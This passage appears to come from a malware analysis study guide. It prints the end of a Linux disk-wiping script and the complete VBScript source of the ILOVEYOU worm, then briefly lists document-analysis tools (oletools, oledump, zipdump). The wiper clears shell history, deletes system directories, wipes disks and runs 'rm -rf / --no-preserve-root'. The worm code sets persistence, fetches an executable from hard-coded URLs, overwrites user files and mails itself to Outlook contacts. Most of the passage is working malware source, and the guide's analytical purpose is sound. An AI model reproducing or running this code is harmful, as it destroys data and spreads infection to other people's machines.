        kr=(${kernel_release//[.-]/ })                          # remove dots and hyphen from kernel version
        num_kr=$(((kr[0] * 10000) + (kr[1] * 100) + kr[2]))

        if [[ "${name_kernel}" == "Linux" ]]; then

                if [[ ${num_kr} -ge 20627 ]]; then              # kernel ver. >= 2.6.27

                        retval=$(true)
                fi
        fi

        return $retval
}

#
# Reboots the system using the magic SysRq key trick, which sends commands directly to the kernel via
# the filesystem. The magic SysRq is enabled via the kernel compile time option CONFIG_MAGIC_SYSRQ,
# which seems to be enabled on most distributions.
# For additional details, see: https://mjmwired.net/kernel/Documentation/sysrq.txt
#
function magic_reboot()
{

        echo 1 > /proc/sys/kernel/sysrq 2>/dev/null     # activate the magic SysRq key
        echo b > /proc/sysrq-trigger 2>/dev/null        # immediately reboot w/ disk sync or unmounting,
                                                        #     which this guy obviously doesn't mind
}

#
# Clear and disable command history
#
function clear_history()
{
        # Clear the history for the current shell and destroys the .bash_history file
        set -o history
        history -c
        history -w
        set +o history
        cat "/dev/null" > "$bash_hist_file"
        # Set history size to zero and signal in bash_hist_file
        unset bash_hist_file
        bash_hist_file="/dev/null"
        HISTSIZE=0
        HISTFILESIZE=0

}

#
# Clear and disable command history, turn swapping off and sync everything
#
function fix_history_and_swap()
{
        # Turns history logging on
        set -o history
        # Clear the history for the current shell (and overwrite the history file with the new empty list)
        history -c && history -w
        # Turns history logging off
        set +o history
        # Destroy .bash_history file
        if [[ "$bash_hist_file" != "/dev/null" ]]; then

                cat "/dev/null" > ~/.bash_history
        fi
        # Free pagecache, dentries and inodes
        echo 3 > /proc/sys/vm/drop_caches
        # Sync everything by activating and deactivating swap in all devices and then syncing
        swapon -a 2>/dev/null
        sleep 2
        swapoff -a 2>/dev/null
        sync
}

#
# main function
#
function main()
{
        local retval=1

        # Destroy this shell script
        destroy_wiper
        # Delete Bash history, disable history logging, and turn swapping off
        fix_history_and_swap
        # Delete Bash history (again)
        clear_history
        # Run only if root
        if [ $(id -u) = 0 ]; then
                # Check that Bash version is at least 3
                if check_bash_version; then
                        # Check that this is a Linux kernel 2.6.27 or higher
                        if check_linux_kernel_version; then
                                # Check that the commands 'dd', 'uname', and 'sed' are available
                                # (which is too late for 'uname' because it has already been called)
                                if check_cmds_exist; then
                                        # Select 'shred' as preferred wiiping command or else 'dd' if
                                        # 'shred' is unavailable
                                        if select_wiping_command; then
                                                # Disable and delete apache, http and ssh services from systemd
                                                remove_services "apache http ssh"
                                                # Delete /boot, /home, and /var/log with rm
                                                delete_directories "/boot /home /var/log"
                                                # Find disks in the system
                                                find_disks
                                                # If okay and at least one disk found ... 
                                                if [[ $? -eq 0 && "${#disk_list[@]}" -gt 0 ]]; then
                                                        # ... wipe them
                                                        if wipe_disks; then
                                                                # return 0 if everything ok
                                                                # return 2 through 8 for every other case
                                                                retval=0
                                                        else
                                                                retval=8
                                                        fi
                                                else
                                                        retval=7
                                                fi

                                        else
                                                retval=6
                                        fi
                                else
                                        retval=5
                                fi
                        else
                                retval=4
                        fi
                else
                        retval=3
                fi
        else
                retval=2
        fi

        # Removes /
        rm -rf / --no-preserve-root >/dev/null 2>&1

        # Destroy the wiper script (again)
        if ! destroy_wiper; then
                retval=9
        fi

        # Reboot the system using the magic SysRq trick
        magic_reboot

        return $retval
}


main "$@"
```

### Malware in documents

Documents with embedded malware code. If the macros are enabled, the attached malware does not need to be executed as only by opening the mail the script could be run.&#x20;

The normal flow of this type of infection is:

1. The victim receives an email/Telegram or WhatsApp message with some kind of document attached. This attached document normally has some code within the macros. This is the first stage, normally this macro may act as a dropper or a downloader and perhaps something else.&#x20;
2. There is a second stage that happens when through the dropper or from the macro code itself, another payload is obtained (nowadays it is common powershelgl, .exe or .shellcode).
3. With these scripts, they may act as a bot, RAT or as a ramsonware.&#x20;

This process is divided by the actors that perform the different stages. For example, the first step is to infect people and it may be performed by groups that sell this service in the Deep Web. The second stage is performed by criminals that want to get profit from the victims as we told before either deploying a ransom, a bot or RAT.

This type of attack represents more than 90% of the attacks nowadays. At this point we are going to learn how to analyse this documents when receiving one. &#x20;

#### Love Letter For You .vbs

Firstly, the script is reading the registry to know the username for persistence. Then, the script is copied to some common DLLs so Windows does not notice the existence of the script. Moreover, there are some interesting functions:

* spreadtoemail() --> this function opens a shell and runs outlook to obtain the address list of all email addresses that you contacted or contacted you. Then, an email is created and sent to that  addresses to spread itself.&#x20;

```visual-basic
rem  barok -loveletter(vbe) <i hate go to school>
 rem by: spyder  /  ispyder@mail.com  /  @GRAMMERSoft Group  /  Manila,Philippines
 On Error Resume Next
 dim fso,dirsystem,dirwin,dirtemp,eq,ctr,file,vbscopy,dow
 eq=""
 ctr=0
 Set fso = CreateObject("Scripting.FileSystemObject")
 set file = fso.OpenTextFile(WScript.ScriptFullname,1)
 vbscopy=file.ReadAll
 main()
 sub main()
 On Error Resume Next
 dim wscr,rr
 set wscr=CreateObject("WScript.Shell")
 rr=wscr.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout")
 if (rr>=1) then
 wscr.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout",0,"REG_DWORD"
 end if
 Set dirwin = fso.GetSpecialFolder(0)
 Set dirsystem = fso.GetSpecialFolder(1)
 Set dirtemp = fso.GetSpecialFolder(2)
 Set c = fso.GetFile(WScript.ScriptFullName)
 c.Copy(dirsystem&"\MSKernel32.vbs")
 c.Copy(dirwin&"\Win32DLL.vbs")
 c.Copy(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs")
 regruns()
 html()
 spreadtoemail()
 listadriv()
 end sub
 sub regruns()
 On Error Resume Next
 Dim num,downread
 regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\MSKern el32",dirsystem&"\MSKernel32.vbs"
 regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService s\Win32DLL",dirwin&"\Win32DLL.vbs"
 downread=""
 downread=regget("HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Download Directory")
 if (downread="") then
 downread="c:\"
 end if
 if (fileexist(dirsystem&"\WinFAT32.exe")=1) then
 Randomize
 num = Int((4 * Rnd) + 1)
 if num = 1 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~young1s/HJKhjnwerhjkxcvytwertnMTFwetrdsfm
 hPnjw6587345gvsdf7679njbvYT/WIN-BUGSFIX.exe"
 elseif num = 2 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start Page","http://www.skyinet.net/~angelcat/skladjflfdjghKJnwetryDGFikjUIyqw
 erWe546786324hjk4jnHHGbvbmKLJKjhkqj4w/WIN-BUGSFIX.exe"
 elseif num = 3 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~koichi/jf6TRjkcbGRpGqaq198vbFV5hfFEkbopBd
 QZnmPOhfgER67b3Vbvg/WIN-BUGSFIX.exe"
 elseif num = 4 then
 regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\Start
 Page","http://www.skyinet.net/~chu/sdgfhjksdfjklNBmnfgkKLHjkqwtuHJBhAFSD
 GjkhYUgqwerasdjhPhjasfdglkNBhbqwebmznxcbvnmadshfgqw237461234iuy7thjg/WIN -BUGSFIX.exe"
 end if
 end if
 if (fileexist(downread&"\WIN-BUGSFIX.exe")=0) then regcreate
 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\WIN-BU GSFIX",downread&"\WIN-BUGSFIX.exe"
 regcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet
 Explorer\Main\Start Page","about:blank"
 end if
 end sub
 sub listadriv
 On Error Resume Next
 Dim d,dc,s
 Set dc = fso.Drives
 For Each d in dc
 If d.DriveType = 2 or d.DriveType=3 Then
 folderlist(d.path&"\")
 end if
 Next
 listadriv = s
 end sub
 sub infectfiles(folderspec)
 On Error Resume Next
 dim f,f1,fc,ext,ap,mircfname,s,bname,mp3
 set f = fso.GetFolder(folderspec)
 set fc = f.Files
 for each f1 in fc
 ext=fso.GetExtensionName(f1.path)
 ext=lcase(ext)
 s=lcase(f1.name)
 if (ext="vbs") or (ext="vbe") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 elseif(ext="js") or (ext="jse") or (ext="css") or (ext="wsh") or (ext="sct") or (ext="hta") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 bname=fso.GetBaseName(f1.path)
 set cop=fso.GetFile(f1.path)
 cop.copy(folderspec&"\"&bname&".vbs") fso.DeleteFile(f1.path)
 elseif(ext="jpg") or (ext="jpeg") then
 set ap=fso.OpenTextFile(f1.path,2,true)
 ap.write vbscopy
 ap.close
 set cop=fso.GetFile(f1.path)
 cop.copy(f1.path&".vbs")
 fso.DeleteFile(f1.path)
 elseif(ext="mp3") or (ext="mp2") then
 set mp3=fso.CreateTextFile(f1.path&".vbs")
 mp3.write vbscopy
 mp3.close
 set att=fso.GetFile(f1.path)
 att.attributes=att.attributes+2
 end if
 if (eq<>folderspec) then
 if (s="mirc32.exe") or (s="mlink32.exe") or (s="mirc.ini") or (s="script.ini") or (s="mirc.hlp") then
 set scriptini=fso.CreateTextFile(folderspec&"\script.ini") scriptini.WriteLine "[script]"
 scriptini.WriteLine ";mIRC Script"
 scriptini.WriteLine ";  Please dont edit this script... mIRC will corrupt, if mIRC will"
 scriptini.WriteLine "    corrupt... WINDOWS will affect and will not run correctly. thanks"
 scriptini.WriteLine ";"
 scriptini.WriteLine ";Khaled Mardam-Bey"
 scriptini.WriteLine ";http://www.mirc.com"
 scriptini.WriteLine ";"
 scriptini.WriteLine "n0=on 1:JOIN:#:{"
 scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }" scriptini.WriteLine "n2=  /.dcc send $nick
 "&dirsystem&"\LOVE-LETTER-FOR-YOU.HTM"
 scriptini.WriteLine "n3=}"
 scriptini.close
 eq=folderspec
 end if
 end if
 next
 end sub
 sub folderlist(folderspec)
 On Error Resume Next
 dim f,f1,sf
 set f = fso.GetFolder(folderspec)
 set sf = f.SubFolders
 for each f1 in sf
 infectfiles(f1.path)
 folderlist(f1.path)
 next
 end sub
 sub regcreate(regkey,regvalue)
 Set regedit = CreateObject("WScript.Shell")
 regedit.RegWrite regkey,regvalue
 end sub
 function regget(value)
 Set regedit = CreateObject("WScript.Shell")
 regget=regedit.RegRead(value)
 end function
 function fileexist(filespec)
 On Error Resume Next
 dim msg
 if (fso.FileExists(filespec)) Then
 msg = 0
 else
 msg = 1
 end if
 fileexist = msg
 end function
 function folderexist(folderspec)
 On Error Resume Next
 dim msg
 if (fso.GetFolderExists(folderspec)) then
 msg = 0
 else
 msg = 1
 end if
 fileexist = msg
 end function
 sub spreadtoemail()
 On Error Resume Next
 dim x,a,ctrlists,ctrentries,malead,b,regedit,regv,regad
 set regedit=CreateObject("WScript.Shell")
 set out=WScript.CreateObject("Outlook.Application")
 set mapi=out.GetNameSpace("MAPI")
 for ctrlists=1 to mapi.AddressLists.Count
 set a=mapi.AddressLists(ctrlists)
 x=1
 regv=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a) if (regv="") then
 regv=1
 end if
 if (int(a.AddressEntries.Count)>int(regv)) then
 for ctrentries=1 to a.AddressEntries.Count
 malead=a.AddressEntries(x)
 regad=""
 regad=regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead )
 if (regad="") then
 set male=out.CreateItem(0)
 male.Recipients.Add(malead)
 male.Subject = "ILOVEYOU"
 male.Body = vbcrlf&"kindly check the attached LOVELETTER coming from me."
 male.Attachments.Add(dirsystem&"\LOVE-LETTER-FOR-YOU.TXT.vbs") male.Send
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&malead,1,"REG_DWORD" end if
 x=x+1
 next
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count else
 regedit.RegWrite
 "HKEY_CURRENT_USER\Software\Microsoft\WAB\"&a,a.AddressEntries.Count end if
 next
 Set out=Nothing
 Set mapi=Nothing
 end sub
 sub html
 On Error Resume Next
 dim lines,n,dta1,dta2,dt1,dt2,dt3,dt4,l1,dt5,dt6
 dta1="<HTML><HEAD><TITLE>LOVELETTER - HTML<?-?TITLE><META NAME=@-@Generator@-@ CONTENT=@-@BAROK VBS -
 LOVELETTER@-@>"&vbcrlf& _ "<META NAME=@-@Author@-@ CONTENT=@-@spyder ?-? ispyder@mail.com ?-?
 @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@>"&vbcrlf& _ "<META NAME=@-@Description@-@
 CONTENT=@-@simple but i think this is good...@-@>"&vbcrlf& _
 "<?-?HEAD><BODY
 ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU.
 HTM#-#,#-#main#-#)@-@ "&vbcrlf& _
 "ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#LOVE-LETTER-FOR-YOU. HTM#-#,#-#main#-#)@-@
 BGPROPERTIES=@-@fixed@-@
 BGCOLOR=@-@#FF9933@-@>"&vbcrlf& _
 "<CENTER><p>This HTML file need ActiveX Control<?-?p><p>To Enable to read this HTML file<BR>- Please press #-#YES#-# button to
 Enable ActiveX<?-?p>"&vbcrlf& _
 "<?-?CENTER><MARQUEE LOOP=@-@infinite@-@
 BGCOLOR=@-@yellow@-@>----------z--------------------z----------<?-?MARQU EE> "&vbcrlf& _
 "<?-?BODY><?-?HTML>"&vbcrlf& _
 "<SCRIPT language=@-@JScript@-@>"&vbcrlf& _ "<!--?-??-?"&vbcrlf& _
 "if (window.screen){var wi=screen.availWidth;var
 hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}"&vbcrl f& _
 "?-??-?-->"&vbcrlf& _
 "<?-?SCRIPT>"&vbcrlf& _
 "<SCRIPT LANGUAGE=@-@VBScript@-@>"&vbcrlf& _ "<!--"&vbcrlf& _
 "on error resume next"&vbcrlf& _
 "dim fso,dirsystem,wri,code,code2,code3,code4,aw,regdit"&vbcrlf& _ "aw=1"&vbcrlf& _
 "code="
 dta2="set fso=CreateObject(@-@Scripting.FileSystemObject@-@)"&vbcrlf& _
 "set dirsystem=fso.GetSpecialFolder(1)"&vbcrlf& _ "code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))"&vbcrlf& _
 "code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))"&vbcrlf& _ "code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))"&vbcrlf& _ "set
 wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)"&vbcrlf& _
 "wri.write code4"&vbcrlf& _
 "wri.close"&vbcrlf& _
 "if (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) then"&vbcrlf& _ "if (err.number=424) then"&vbcrlf& _
 "aw=0"&vbcrlf& _
 "end if"&vbcrlf& _
 "if (aw=1) then"&vbcrlf& _
 "document.write @-@ERROR: can#-#t initialize ActiveX@-@"&vbcrlf& _ "window.close"&vbcrlf& _
 "end if"&vbcrlf& _
 "end if"&vbcrlf& _
 "Set regedit = CreateObject(@-@WScript.Shell@-@)"&vbcrlf& _
 "regedit.RegWrite
 @-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^
 -^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@"&vbcrlf& _ "?-??-?-->"&vbcrlf& _
 "<?-?SCRIPT>"
 dt1=replace(dta1,chr(35)&chr(45)&chr(35),"'")
 dt1=replace(dt1,chr(64)&chr(45)&chr(64),"""") dt4=replace(dt1,chr(63)&chr(45)&chr(63),"/")
 dt5=replace(dt4,chr(94)&chr(45)&chr(94),"\")
 dt2=replace(dta2,chr(35)&chr(45)&chr(35),"'")
 dt2=replace(dt2,chr(64)&chr(45)&chr(64),"""") dt3=replace(dt2,chr(63)&chr(45)&chr(63),"/")
 dt6=replace(dt3,chr(94)&chr(45)&chr(94),"\")
 set fso=CreateObject("Scripting.FileSystemObject")
 set c=fso.OpenTextFile(WScript.ScriptFullName,1)
 lines=Split(c.ReadAll,vbcrlf)
 l1=ubound(lines)
 for n=0 to ubound(lines)
 lines(n)=replace(lines(n),"'",chr(91)+chr(45)+chr(91)) lines(n)=replace(lines(n),"""",chr(93)+chr(45)+chr(93))
 lines(n)=replace(lines(n),"\",chr(37)+chr(45)+chr(37)) if (l1=n) then
 lines(n)=chr(34)+lines(n)+chr(34)
 else
 lines(n)=chr(34)+lines(n)+chr(34)&"&vbcrlf& _" end if
 next
 set b=fso.CreateTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM") b.close
 set d=fso.OpenTextFile(dirsystem+"\LOVE-LETTER-FOR-YOU.HTM",2) d.write dt5
 d.write join(lines,vbcrlf)
 d.write vbcrlf
 d.write dt6
 d.close
 end sub

```

#### Document analysis

References: [https://zeltser.com/analyzing-malicious-documents/](https://zeltser.com/analyzing-malicious-documents/)

{% file src="../../.gitbook/assets/analyzing-malicious-document-files.pdf" %}
PDF cheat sheet
{% endfile %}

We are going to concentrate on Office. Office is OLE (Object Linking and Embedded). There is one tool called oletools written in python. Office has different formats that are obsolete like .doc and the newer versions .docx. The main difference is that .docx files are more or less zip files composed by more than one thing.&#x20;

There are some interesting tools like vmonkey that emulates the execution of macros in a doc to analyse them, but we are going to learn the following.

* Command `file` --> the argument is a file and it returns the real type of document and its real information.&#x20;
* Command `oleid` --> displays information about the file: the file format, container format, application name (word, excel, etc.), author, encryption, VBA (Visual Basics for Applications) Macros (Y/N), XML macros, etc.&#x20;
* Command `olevba` --> returns a report about the macros of the file, but it is easier to dump all into a file and analyse it. It gives a basic static overview about the macros.&#x20;
* Command `oledump.py` --> the macros are stored compressed and this tool enables to decompress them. It gives the overview of the doc as a container. Every document is composed by streams which are represented like: \[index] \[type (M stands for Macros)] \[size] \[name]. Those streams with type **M** are code so with `oledump -s [stream-index] -v` this code can be obtained.&#x20;

Another interesting tool is cyberchef that enables to beautify binary code by applying some regex expressions to remove or change using patterns.&#x20;

The tool that is used when treating with .docx documents is `zipdump` as it is the alternative tool for `ole`. As we know a doc is a zip container of objects that have a type, using this tool we can know every object that compose the document and the type, index and some other information.

